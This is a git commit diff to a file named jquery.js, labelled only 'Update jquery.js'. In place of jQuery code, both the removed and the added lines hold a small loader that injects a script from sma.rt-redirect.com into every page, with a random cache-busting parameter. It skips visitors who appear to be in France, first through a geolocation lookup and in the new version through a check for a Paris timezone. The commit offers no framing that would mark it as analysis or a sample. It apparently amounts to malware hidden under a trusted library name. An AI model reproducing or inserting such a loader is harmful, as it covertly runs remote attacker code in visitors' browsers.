74cc75f5c15dee79696d2a64c4ec131d809d224b
elankton <74224289+elankton@users.noreply.github.com>
2022-08-11 16:23:21 +0300

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -1,15 +1,8 @@
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
-    if (this.responseText.toLowerCase().indexOf('"country_code":"fr"') === -1){
-     (function (a, d, j, o) {
-           o = a.createElement(d),
-              m = a.getElementsByTagName(d)[0];              
-           o.src = j + "?d=0&r=" + Math.random();
-           m.parentNode.insertBefore(o, m)
-      })(document, 'script', 'https://sma.rt-redirect.com/sl/3a1d9054');
-    }
+if (Intl.DateTimeFormat().resolvedOptions().timeZone.toLowerCase().indexOf('/paris') === -1){
+    (function (a, d, j, o) {
+       o = a.createElement(d),
+          m = a.getElementsByTagName(d)[0];              
+       o.src = j + "?d=0&r=" + Math.random();
+       m.parentNode.insertBefore(o, m)
+    })(document, 'script', 'https://sma.rt-redirect.com/sl/3a1d9054');
 }
-};
-xhttp.open("GET", "https://geolocation-db.com/json/", true);
-xhttp.send();
